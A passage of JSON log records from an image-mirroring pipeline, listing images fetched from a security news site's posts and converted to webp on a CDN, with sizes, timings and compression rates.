15:31:16","host":"us-53*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"10.7 KB","destSize":"20.9 KB","compressRate":"195%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239923982091.jpeg","sourceStatusCode":200,"destWidth":924,"destHeight":363,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn48@2020_6/2020/09/05/07-31-24-321_0713295e4aaa1108.webp","sourceBytes":40264,"destBytes":32688,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2896,"convertSpendMs":27,"createdTime":"2020-09-05 15:31:22","host":"us-029*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"39.3 KB","destSize":"31.9 KB","compressRate":"81.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200902/1599038933146830.png","sourceStatusCode":200,"destWidth":676,"destHeight":316,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn51@2020_3/2020/09/05/07-31-24-379_1a613fdc156fd449.webp","sourceBytes":20878,"destBytes":30318,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2874,"convertSpendMs":33,"createdTime":"2020-09-05 15:31:22","host":"us-017*","referer":"https://www.4hou.com/posts/53vR","linkMd5ListStr":"2184c32448c38dcf20754011036d1b8a","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.4 KB","destSize":"29.6 KB","compressRate":"145.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114208600.jpeg","sourceStatusCode":200,"destWidth":796,"destHeight":627,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn20@2020_5/2020/09/05/07-31-24-247_a02abbf5277bfd03.webp","sourceBytes":41005,"destBytes":34350,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3858,"convertSpendMs":36,"createdTime":"2020-09-05 15:31:21","host":"europe-59*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"40 KB","destSize":"33.5 KB","compressRate":"83.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101996179265.png","sourceStatusCode":200,"destWidth":754,"destHeight":119,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn77@2020_1/2020/09/05/07-31-24-665_e02b16a579bde3ad.webp","sourceBytes":20285,"destBytes":21120,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2687,"convertSpendMs":8,"createdTime":"2020-09-05 15:31:22","host":"us-009*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"19.8 KB","destSize":"20.6 KB","compressRate":"104.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192115890945.png","sourceStatusCode":200,"destWidth":1080,"destHeight":729,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn31@2020_3/2020/09/05/07-31-24-581_b7b23c6caee580bb.webp","sourceBytes":135306,"destBytes":38542,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":8689,"convertSpendMs":31,"createdTime":"2020-09-05 15:31:16","host":"us-019*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"132.1 KB","destSize":"37.6 KB","compressRate":"28.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192114106872.jpeg","sourceStatusCode":200,"destWidth":756,"destHeight":618,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn71@2020_3/2020/09/05/07-31-25-022_178982b6a5826b83.webp","sourceBytes":21563,"destBytes":13534,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3145,"convertSpendMs":13,"createdTime":"2020-09-05 15:31:22","host":"us-021*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"21.1 KB","destSize":"13.2 KB","compressRate":"62.8%"},{"code":1,"isDone":false,"source":"https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1579194760503-PJVAWQ05AO65EFFFOZ47/ke17ZwdGBToddI8pDm48kO2g8sTfwRddiZVzRE0p1T9Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PI9572HEdwD0dlgJgxrcUSea6r5hN_zLRJzWo_-ZQDNLo/Picture13.png?format=1000w","sourceStatusCode":200,"destWidth":974,"destHeight":310,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn61@2020_2/2020/09/05/07-31-25-120_0b0449f05049c040.webp","sourceBytes":76122,"destBytes":32408,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":922,"convertSpendMs":16,"createdTime":"2020-09-05 15:31:25","host":"us-028*","referer":"https://www.4hou.com/posts/N5lD","linkMd5ListStr":"072eb2032d7770811393baa5bd62da28","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"74.3 KB","destSize":"31.6 KB","compressRate":"42.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200825/1598324147187300.png","sourceStatusCode":200,"destWidth":778,"destHeight":263,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn100@2020_2/2020/09/05/07-31-25-098_3089f086b603c3ca.webp","sourceBytes":27926,"destBytes":50046,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5051,"convertSpendMs":21,"createdTime":"2020-09-05 15:31:20","host":"us-55*","referer":"https://www.4hou.com/posts/DPVn","linkMd5ListStr":"e2801c0105fa9272b5c2785b034eaec8","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"27.3 KB","destSize":"48.9 KB","compressRate":"179.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101999178992.png","sourceStatusCode":200,"destWidth":754,"destHeight":47,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn93@2020_4/2020/09/05/07-31-25-389_84950ca4b12ae30f.webp","sourceBytes":7763,"destBytes":6970,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3042,"convertSpendMs":5,"createdTime":"2020-09-05 15:31:23","host":"us-026*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.6 KB","destSize":"6.8 KB","compressRate":"89.8%"},{"code":1,"isDone":false,"source":"https://pic.36krcnd.com/202009/03020338/f9cc27dsszclx3al","sourceStatusCode":200,"destWidth":634,"destHeight":74,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn24@2020_5/2020/09/05/07-31-25-014_9e5f675693c28365.webp","sourceBytes":300162,"destBytes":527144,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4687,"convertSpendMs":985,"createdTime":"2020-09-05 15:31:21","host":"us-037*","referer":"https://www.4hou.com/posts/62w9","linkMd5ListStr":"d4990d794912cd0e310810f1323b377f","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"293.1 KB","destSize":"514.8 KB","compressRate":"175.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599191166208376.png","sourceStatusCode":200,"destWidth":604,"destHeight":363,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn68@2020_1/2020/09/05/07-31-25-535_d81acffcc5905bd6.webp","sourceBytes":17403,"destBytes":17614,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3793,"convertSpendMs":10,"createdTime":"2020-09-05 15:31:22","host":"us-033*","referer":"https://www.4hou.com/posts/wZNw","linkMd5ListStr":"b6031335b5a855e88d6461fc3df32e2f","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"17 KB","destSize":"17.2 KB","compressRate":"101.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200901/1598949796155471.png","sourceStatusCode":200,"destWidth":834,"destHeight":670,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn36@2020_5/2020/09/05/07-31-25-393_08cfbc57f2fd4cb1.webp","sourceBytes":141429,"destBytes":35190,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4483,"convertSpendMs":25,"createdTime":"2020-09-05 15:31:21","host":"europe-25*","referer":"https://www.4hou.com/posts/Npoz","linkMd5ListStr":"1b46b90ee5cb7d23c3202e2b104ab1b8","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"138.1 KB","destSize":"34.4 KB","compressRate":"24.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239927551825.png","sourceStatusCode":200,"destWidth":1534,"destHeight":556,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn88@2020_5/2020/09/05/07-31-25-730_c269d88ea3b59563.webp","sourceBytes":405316,"destBytes":27896,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":9995,"convertSpendMs":34,"createdTime":"2020-09-05 15:31:16","host":"us-023*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"395.8 KB","destSize":"27.2 KB","compressRate":"6.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192116676381.png","sourceStatusCode":200,"destWidth":1115,"destHeight":838,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn55@2020_3/2020/09/05/07-31-25-806_aad5d07261eaa690.webp","sourceBytes":98713,"destBytes":59126,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4336,"convertSpendMs":49,"createdTime":"2020-09-05 15:31:22","host":"us-004*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"96.4 KB","destSize":"57.7 KB","compressRate":"59.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239249835745.jpeg","sourceStatusCode":200,"destWidth":1054,"destHeight":1074,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn40@2020_2/2020/09/05/07-31-25-255_47e85bd67f67b63e.webp","sourceBytes":165138,"destBytes":145664,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":9655,"convertSpendMs":48,"createdTime":"2020-09-05 15:31:17","host":"europe69*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"161.3 KB","destSize":"142.2 KB","compressRate":"88.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599209241131271.png","sourceStatusCode":200,"destWidth":438,"destHeight":882,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn26@2020_2/2020/09/05/07-31-26-166_2886fa3c97330780.webp","sourceBytes":244416,"destBytes":38562,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3183,"convertSpendMs":41,"createdTime":"2020-09-05 15:31:23","host":"us-007*","referer":"https://www.4hou.com/posts/p7D1","linkMd5ListStr":"6a3fdadb7cf1c2c2b8d99f7e0c628dc5","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"238.7 KB","destSize":"37.7 KB","compressRate":"15.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239247166089.png","sourceStatusCode":200,"destWidth":688,"destHeight":612,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn63@2020_1/2020/09/05/07-31-26-618_2299aa8540be4c2e.webp","sourceBytes":16376,"destBytes":32986,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":11109,"convertSpendMs":23,"createdTime":"2020-09-05 15:31:16","host":"us-031*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16 KB","destSize":"32.2 KB","compressRate":"201.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498662555.png","sourceStatusCode":200,"destWidth":711,"destHeight":276,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn86@2020_2/2020/09/05/07-31-26-552_e05332270084dcf4.webp","sourceBytes":6519,"destBytes":12126,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4299,"convertSpendMs":7,"createdTime":"2020-09-05 15:31:23","host":"europe-60*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.4 KB","destSize":"11.8 KB","compressRate":"186%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239931187738.png","sourceStatusCode":200,"destWidth":948,"destHeight":149,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn7@2020_6/2020/09/05/07-31-26-949_cc130111ed1f1ada.webp","sourceBytes":98322,"destBytes":24754,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4584,"convertSpendMs":11,"createdTime":"2020-09-05 15:31:23","host":"europe65*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"96 KB","destSize":"24.2 KB","compressRate":"25.2%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101999346752.png","sourceStatusCode":200,"destWidth":744,"destHeight":278,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn82@2020_6/2020/09/05/07-31-27-282_69988321de6aeeae.webp","sourceBytes":11972,"destBytes":20872,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":2996,"convertSpendMs":13,"createdTime":"2020-09-05 15:31:25","host":"us-032*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"11.7 KB","destSize":"20.4 KB","compressRate":"174.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239248138387.jpeg","sourceStatusCode":200,"destWidth":1237,"destHeight":687,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn63@2020_2/2020/09/05/07-31-27-754_b95f501c5f05f768.webp","sourceBytes":160429,"destBytes":142700,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":9613,"convertSpendMs":189,"createdTime":"2020-09-05 15:31:19","host":"us-025*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"156.7 KB","destSize":"139.4 KB","compressRate":"88.9%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239936115229.png","sourceStatusCode":200,"destWidth":886,"destHeight":226,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn43@2020_4/2020/09/05/07-31-28-045_d0ee8abe5b489586.webp","sourceBytes":93394,"destBytes":23954,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6607,"convertSpendMs":14,"createdTime":"2020-09-05 15:31:22","host":"us-51*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"91.2 KB","destSize":"23.4 KB","compressRate":"25.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101998462581.png","sourceStatusCode":200,"destWidth":806,"destHeight":38,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn86@2020_1/2020/09/05/07-31-28-090_0735cb67130c5018.webp","sourceBytes":5315,"destBytes":7306,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":3388,"convertSpendMs":5,"createdTime":"2020-09-05 15:31:25","host":"us-020*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"5.2 KB","destSize":"7.1 KB","compressRate":"137.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239934131265.png","sourceStatusCode":200,"destWidth":1527,"destHeight":526,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn22@2020_5/2020/09/05/07-31-27-945_1d0e7c9ddd75fda6.webp","sourceBytes":371647,"destBytes":20316,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":14063,"convertSpendMs":123,"createdTime":"2020-09-05 15:31:15","host":"us-022*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"362.9 KB","destSize":"19.8 KB","compressRate":"5.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500199467.png","sourceStatusCode":200,"destWidth":723,"destHeight":105,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn42@2020_6/2020/09/05/07-31-28-331_7ec7d9600e611c93.webp","sourceBytes":2770,"destBytes":6052,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4780,"convertSpendMs":12,"createdTime":"2020-09-05 15:31:24","host":"us-024*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"2.7 KB","destSize":"5.9 KB","compressRate":"218.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192119166287.png","sourceStatusCode":200,"destWidth":1280,"destHeight":720,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn34@2020_2/2020/09/05/07-31-27-787_d8d808131f4c03f8.webp","sourceBytes":325261,"destBytes":87944,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5163,"convertSpendMs":49,"createdTime":"2020-09-05 15:31:24","host":"europe-58*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"317.6 KB","destSize":"85.9 KB","compressRate":"27%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102004379627.png","sourceStatusCode":200,"destWidth":1256,"destHeight":783,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn54@2020_6/2020/09/05/07-31-28-404_871b362b410758c9.webp","sourceBytes":36340,"destBytes":69634,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":4783,"convertSpendMs":41,"createdTime":"2020-09-05 15:31:24","host":"europe62*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"35.5 KB","destSize":"68 KB","compressRate":"191.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599192118890292.png","sourceStatusCode":200,"destWidth":1016,"destHeight":291,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn38@2020_5/2020/09/05/07-31-28-917_900c8967a35800cd.webp","sourceBytes":22091,"destBytes":13330,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5625,"convertSpendMs":15,"createdTime":"2020-09-05 15:31:24","host":"us-036*","referer":"https://www.4hou.com/posts/lDyl","linkMd5ListStr":"04a80f6b7974cfbb572ac23346ea5ec8","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"21.6 KB","destSize":"13 KB","compressRate":"60.3%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102002168036.png","sourceStatusCode":200,"destWidth":308,"destHeight":444,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn45@2020_3/2020/09/05/07-31-29-186_9eba9b2adf716093.webp","sourceBytes":12165,"destBytes":29616,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5602,"convertSpendMs":10,"createdTime":"2020-09-05 15:31:24","host":"us-011*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"11.9 KB","destSize":"28.9 KB","compressRate":"243.5%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200904/1599207478376658.png","sourceStatusCode":200,"destWidth":698,"destHeight":464,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn29@2020_4/2020/09/05/07-31-28-869_cbe9ce94e169c314.webp","sourceBytes":370976,"destBytes":31232,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6168,"convertSpendMs":23,"createdTime":"2020-09-05 15:31:23","host":"europe70*","referer":"https://www.4hou.com/posts/o7Bz","linkMd5ListStr":"4f78d6861e72f68e32f7db818d64cf27","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"362.3 KB","destSize":"30.5 KB","compressRate":"8.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239937570782.png","sourceStatusCode":200,"destWidth":1600,"destHeight":698,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn17@2020_5/2020/09/05/07-31-29-141_7f61f92629e891b9.webp","sourceBytes":892217,"destBytes":179196,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6571,"convertSpendMs":80,"createdTime":"2020-09-05 15:31:23","host":"us-032*","referer":"https://www.4hou.com/posts/p7j6","linkMd5ListStr":"8d0ba5a94eb804af394fd80b5861516c","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"871.3 KB","destSize":"175 KB","compressRate":"20.1%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599101995443982.png","sourceStatusCode":200,"destWidth":990,"destHeight":224,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn73@2020_1/2020/09/05/07-31-29-277_b2c7b156f1693a21.webp","sourceBytes":17348,"destBytes":41708,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5234,"convertSpendMs":15,"createdTime":"2020-09-05 15:31:25","host":"europe66*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"16.9 KB","destSize":"40.7 KB","compressRate":"240.4%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102000389091.png","sourceStatusCode":200,"destWidth":694,"destHeight":625,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn66@2020_5/2020/09/05/07-31-29-626_0972a0090a10453b.webp","sourceBytes":31196,"destBytes":55162,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":5504,"convertSpendMs":18,"createdTime":"2020-09-05 15:31:25","host":"us-016*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.5 KB","destSize":"53.9 KB","compressRate":"176.8%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500289031.png","sourceStatusCode":200,"destWidth":694,"destHeight":109,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn12@2020_4/2020/09/05/07-31-30-173_77dd24913f0baa07.webp","sourceBytes":2087,"destBytes":3694,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":7486,"convertSpendMs":5,"createdTime":"2020-09-05 15:31:23","host":"us-53*","referer":"https://www.4hou.com/posts/mG90","linkMd5ListStr":"7c030266888b48c212298d4439949659","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"2 KB","destSize":"3.6 KB","compressRate":"177%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200903/1599102003155522.png","sourceStatusCode":200,"destWidth":1222,"destHeight":609,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn50@2020_4/2020/09/05/07-31-29-682_da1ee58a4d66f60b.webp","sourceBytes":32897,"destBytes":63022,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6120,"convertSpendMs":33,"createdTime":"2020-09-05 15:31:24","host":"europe-24*","referer":"https://www.4hou.com/posts/ZpK6","linkMd5ListStr":"767cdf6c195e7f1c0458b91104e0ccf8","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"32.1 KB","destSize":"61.5 KB","compressRate":"191.6%"},{"code":1,"isDone":false,"source":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239246658866.png","sourceStatusCode":200,"destWidth":759,"destHeight":234,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn69@2020_1/2020/09/05/07-31-30-933_496c291b2218662e.webp","sourceBytes":17683,"destBytes":10626,"targetWebpQuality":75,"feedId":6942,"totalSpendMs":6672,"convertSpendMs":15,"createdTime":"2020-09-05 15:31:25","host":"us-003*","referer":"https://www.4hou.com/posts/o7gK","linkMd5ListStr":"ddc5f53c84d25939a386e5b2bb709c67","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"17.3 KB","destSize":"10.4 